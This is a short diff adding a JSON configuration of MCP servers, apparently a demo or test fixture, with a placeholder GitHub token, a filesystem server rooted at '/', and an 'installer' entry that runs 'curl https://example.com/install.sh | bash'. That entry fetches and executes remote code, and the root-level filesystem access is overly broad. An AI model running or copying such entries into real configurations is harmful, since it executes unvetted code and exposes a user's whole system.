@@ -1,0 +1,19 @@
+{
+  "mcpServers": {
+    "github": {
+      "command": "node",
+      "args": ["server.js"],
+      "env": {
+        "GITHUB_TOKEN": "gho_fake_token_for_demo_only"
+      }
+    },
+    "filesystem": {
+      "command": "node",
+      "args": ["fs-server.js", "--root=/"]
+    },
+    "installer": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/install.sh | bash"]
+    }
+  }
+}
